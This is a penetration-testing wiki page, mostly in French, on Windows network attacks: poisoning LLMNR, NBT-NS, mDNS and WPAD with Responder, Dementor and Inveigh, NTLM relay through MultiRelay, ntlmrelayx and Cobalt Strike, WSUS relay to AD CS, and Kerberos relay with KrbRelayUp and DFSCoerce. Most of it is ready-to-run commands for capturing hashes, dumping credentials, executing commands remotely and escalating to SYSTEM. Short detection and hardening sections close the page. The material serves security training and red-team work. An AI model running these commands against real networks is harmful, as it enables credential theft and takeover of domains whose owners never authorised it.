# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Protocoles réseau

### Protocoles de résolution de noms locaux

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft et autres systèmes d'exploitation utilisent LLMNR et NBT-NS pour la résolution de noms locale lorsque DNS échoue. De même, les systèmes Apple et Linux utilisent mDNS.
- Ces protocoles sont susceptibles d'interception et de spoofing en raison de leur nature non authentifiée et broadcast sur UDP.
- [Responder](https://github.com/lgandx/Responder) and [Dementor](https://github.com/MatrixEditor/Dementor) peuvent être utilisés pour usurper des services en envoyant des réponses falsifiées aux hôtes qui interrogent ces protocoles.
- De plus amples informations sur l'usurpation de services utilisant Responder sont disponibles [ici](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD permet aux navigateurs de découvrir automatiquement les paramètres de proxy.
- La découverte se fait via DHCP, DNS, ou par repli sur LLMNR et NBT-NS si DNS échoue.
- Responder peut automatiser les attaques WPAD, dirigeant les clients vers des serveurs WPAD malveillants.

### Responder/Dementor for Protocol Poisoning

- **Responder** est un outil utilisé pour empoisonner les requêtes LLMNR, NBT-NS et mDNS, répondant de manière sélective selon le type de requête, ciblant principalement les services SMB.
- Il est préinstallé dans Kali Linux, configurable dans `/etc/responder/Responder.conf`.
- Responder affiche les hashes capturés à l'écran et les enregistre dans le répertoire `/usr/share/responder/logs`.
- Il prend en charge IPv4 et IPv6.
- Une version Windows de Responder est disponible [ici](https://github.com/lgandx/Responder-Windows).

- **Dementor** étend les fonctionnalités d'empoisonnement multicast et agit en outre comme fournisseur de services malveillant (incluant le support CUPS RCE)
- La structure générale est similaire à **Responder** avec une configuration plus granulaire. (le fichier par défaut est ici : [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- La compatibilité entre **Dementor** et **Responder** est indiquée ici : [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro et documentation ici : [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Corrige les problèmes de capture introduits par Responder sur certains protocoles

#### Lancer Responder

- Pour lancer Responder avec les paramètres par défaut : `responder -I <Interface>`
- Pour des sondages plus agressifs (avec effets secondaires possibles) : `responder -I <Interface> -P -r -v`
- Techniques pour capturer les challenges/réponses NTLMv1 pour faciliter le cracking : `responder -I <Interface> --lm --disable-ess`
- L'usurpation WPAD peut être activée avec : `responder -I <Interface> --wpad`
- Les requêtes NetBIOS peuvent être résolues vers l'IP de l'attaquant, et un proxy d'authentification peut être mis en place : `responder.py -I <interface> -Pv`

#### Lancer Dementor

- Avec les paramètres par défaut : `Dementor -I <interface>`
- Avec les paramètres par défaut en mode analyse : `Dementor -I <interface> -A`
- Rétrogradation automatique de session NTLM (ESS) : `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Exécuter la session courante avec une config personnalisée : `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Le spoofing des réponses DHCP peut empoisonner de façon permanente les informations de routage d'une victime, offrant une alternative plus discrète à l'ARP poisoning.
- Cela nécessite une connaissance précise de la configuration du réseau cible.
- Lancer l'attaque : `./Responder.py -I eth0 -Pdv`
- Cette méthode peut capturer efficacement les hashes NTLMv1/2, mais nécessite une manipulation prudente pour éviter la perturbation du réseau.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor vont usurper des services utilisant les protocoles mentionnés ci-dessus, capturant des identifiants (généralement NTLMv2 Challenge/Response) lorsqu'un utilisateur tente de s'authentifier contre les services usurpés.
- Des tentatives peuvent être faites pour rétrograder vers NetNTLMv1 ou désactiver ESS afin de faciliter le cracking des identifiants.

Il est crucial de noter que l'utilisation de ces techniques doit être effectuée légalement et de manière éthique, avec une autorisation appropriée et en évitant toute perturbation ou accès non autorisé.

## Inveigh

Inveigh est un outil pour penetration testers and red teamers, conçu pour les systèmes Windows. Il offre des fonctionnalités similaires à Responder, exécutant du spoofing et des attaques man-in-the-middle. L'outil a évolué d'un script PowerShell vers un binaire C#, avec [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) et [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) comme principales versions. Les paramètres détaillés et instructions se trouvent dans le [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh peut être utilisé via PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou exécuté en tant que binaire C# :
```bash
Inveigh.exe
```
### NTLM Relay Attack

Cette attaque exploite les sessions d'authentification SMB pour accéder à une machine cible, accordant un shell système si elle réussit. Les prérequis clés incluent :

- L'utilisateur authentifié doit disposer d'un accès Local Admin sur l'hôte relayé.
- SMB signing doit être désactivé.

#### 445 Port Forwarding and Tunneling

Dans les scénarios où une introduction réseau directe n'est pas possible, le trafic sur le port 445 doit être redirigé et tunnelisé. Des outils tels que [**PortBender**](https://github.com/praetorian-inc/PortBender) aident à rediriger le trafic du port 445 vers un autre port, ce qui est essentiel lorsque l'accès Local Admin est disponible pour le chargement de drivers.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Autres outils pour NTLM Relay Attack

- **Metasploit** : Configurer avec des proxies, et les détails de l'hôte local et distant.
- **smbrelayx** : Un script Python pour relayer des sessions SMB et exécuter des commandes ou déployer des backdoors.
- **MultiRelay** : Un outil de la suite Responder pour relayer des utilisateurs spécifiques ou tous les utilisateurs, exécuter des commandes ou dump hashes.

Chaque outil peut être configuré pour fonctionner via un SOCKS proxy si nécessaire, permettant des attaques même avec un accès réseau indirect.

### Fonctionnement de MultiRelay

MultiRelay s'exécute depuis le répertoire _**/usr/share/responder/tools**_, en ciblant des adresses IP ou des utilisateurs spécifiques.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Ces outils et techniques constituent un ensemble complet pour effectuer des attaques NTLM Relay dans divers environnements réseau.

### Abuser de WSUS HTTP (8530) pour NTLM Relay vers LDAP/SMB/AD CS (ESC8)

WSUS clients s'authentifient auprès de leur serveur de mise à jour en utilisant NTLM sur HTTP (8530) ou HTTPS (8531). Lorsque HTTP est activé, les vérifications périodiques des clients peuvent être coercées ou interceptées sur le segment local et relayées avec ntlmrelayx vers des points de terminaison LDAP/LDAPS/SMB ou AD CS HTTP (ESC8) sans craquer de hachages. Cela se fond dans le trafic de mise à jour normal et donne fréquemment des authentifications de comptes-machine (HOST$).

What to look for
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Non authentifié
- Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Surveillez le trafic HTTP WSUS via un MITM L2 et consignez les clients/endpoints actifs avec wsusniff.py (HTTP seulement à moins de pouvoir faire faire confiance à votre certificat TLS aux clients).
- Authentifié
- Parse SYSVOL GPOs for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
- Query endpoints at scale from hosts (NetExec) or locally:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Position for MITM (same L2) so a client resolves the WSUS server to you (ARP/DNS poisoning, Bettercap, mitm6, etc.). Example with arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Redirect port 8530 to your relay listener (optional, convenient):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Start ntlmrelayx with the HTTP listener (requires Impacket support for HTTP listener; see PRs below):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Trigger a client check-in or wait for schedule. From a client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Use the authenticated SOCKS sessions (if -socks) or direct relay results for post-exploitation (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).

HTTPS constraint (8531)
- L'interception passive de WSUS via HTTPS est inefficace à moins que les clients ne fassent confiance à votre certificat. Sans un certificat de confiance ou une autre rupture TLS, la poignée de main NTLM ne peut pas être récoltée/relayée depuis le trafic WSUS HTTPS.

Notes
- WSUS a été annoncé comme obsolète mais reste largement déployé ; HTTP (8530) est encore courant dans de nombreux environnements.
- Outils utiles: wsusniff.py (observer les check-ins WSUS HTTP), wsuspider.sh (énumérer WUServer/WUStatusServer depuis les GPOs), NetExec reg-query à grande échelle.
- Impacket a restauré le support du listener HTTP pour ntlmrelayx dans le PR #2034 (ajout initial dans le PR #913).

### Forcer les connexions NTLM

In Windows you **may be able to force some privileged accounts to authenticate to arbitrary machines**. Read the following page to learn how:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** steals an **AP-REQ ticket** from one service and re-uses it against a second service that shares the **same computer-account key** (because both SPNs sit on the same `$` machine account). This works even though the SPNs’ **service classes differ** (e.g. `CIFS/` → `LDAP/`) because the *key* that decrypts the ticket is the machine’s NT hash, not the SPN string itself and the SPN string is not part of the signature.

Unlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\SYSTEM** in a single shot.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Prouve l'utilisateur auprès du KDC | inaltéré |
| **Service ticket / TGS-REQ ↔ REP** | Lié à un **SPN** ; chiffré avec la clé du propriétaire du SPN | interchangeable si les SPN partagent le même compte |
| **AP-REQ** | Le client envoie le `TGS` au service | **ce que nous volons et rejouons** |

* Les tickets sont chiffrés avec la **clé dérivée du mot de passe du compte qui possède le SPN**.
* L'**Authenticator** à l'intérieur de l'AP-REQ contient un horodatage de 5 minutes ; une relecture dans cette fenêtre est valide jusqu'à ce que le cache du service détecte un doublon.
* Windows vérifie rarement si la chaîne SPN dans le ticket correspond au service que vous touchez, donc un ticket pour `CIFS/HOST` se déchiffre normalement bien sur `LDAP/HOST`.

- 2. **Ce qui doit être vrai pour relayer Kerberos**

1. **Shared key:** source and target SPNs belong to the same computer account (default on Windows servers).
2. **No channel protection:** SMB/LDAP signing off and EPA off for HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** you win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.
5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify the DNS of the domain or being able to change the HOST file of the victim.

### Kerberos Relay Steps

- 3.1 **Recon de l'hôte**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Démarrer le relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` regroupe **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** en un seul binaire.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce fait en sorte que le DC envoie un ticket Kerberos `CIFS/DC01` vers nous.

- 3.4 **Relay the AP-REQ**

KrbRelay extrait le GSS blob de SMB, le réemballe dans un LDAP bind, et le transmet à `ldap://DC01` — l'authentification réussit parce que la **même clé** le déchiffre.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Vous possédez maintenant **NT AUTHORITY\SYSTEM**.


### **Autres chemins à connaître**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Un faux serveur envoie un **GSS-ID payload** avec n'importe quel SPN ; le client construit une AP-REQ directement vers vous | Works even across subnets; machine creds by default |
| **DCOM / MSRPC** | Un OXID resolver malveillant force le client à s'authentifier sur un SPN et un port arbitraires | Priv-esc purement *locale* ; contourne le pare-feu |
| **AD CS Web Enroll** | Relayer le ticket machine vers `HTTP/CA` et obtenir un cert, puis **PKINIT** pour mint TGTs | Contourne les protections de signature LDAP |
| **Shadow Credentials** | Écrire `msDS-KeyCredentialLink`, puis PKINIT avec une paire de clés forgée | Pas besoin d'ajouter un compte machine |

### **Dépannage**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Clé du ticket ≠ clé cible | Mauvais hôte/SPN |
| `KRB_AP_ERR_SKEW` | Horloge > 5 min de décalage | Synchroniser l'heure ou utiliser `w32tm` |
| LDAP bind fails | Signature requise | Utiliser le chemin AD CS ou désactiver la signature |
| Event 4649 spam | Le service a vu un Authenticator dupliqué | bloquer ou devancer (race) le paquet original |


### **Détection**

* Augmentation des **Event 4769** pour `CIFS/`, `HTTP/`, `LDAP/` provenant de la même source en quelques secondes.
* **Event 4649** sur le service indique une tentative de replay détectée.
* Un logon Kerberos depuis **127.0.0.1** (relay vers le SCM local) est très suspect — cartographier via une règle Sigma dans les docs KrbRelayUp.
* Surveiller les modifications des attributs `msDS-AllowedToActOnBehalfOfOtherIdentity` ou `msDS-KeyCredentialLink`.

## **Durcissement**

1. Exiger la signature LDAP et SMB + EPA sur chaque serveur.
2. Séparer les SPNs afin que HTTP ne soit pas sur le même compte que CIFS/LDAP.
3. Corriger les vecteurs de coercition (PetitPotam KB5005413, DFS, AuthIP).
4. Définir **`ms-DS-MachineAccountQuota = 0`** pour empêcher les jonctions de comptes ordinateurs non autorisées.
5. Alerter sur **Event 4649** et les logons Kerberos en loopback inattendus.



## References

- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
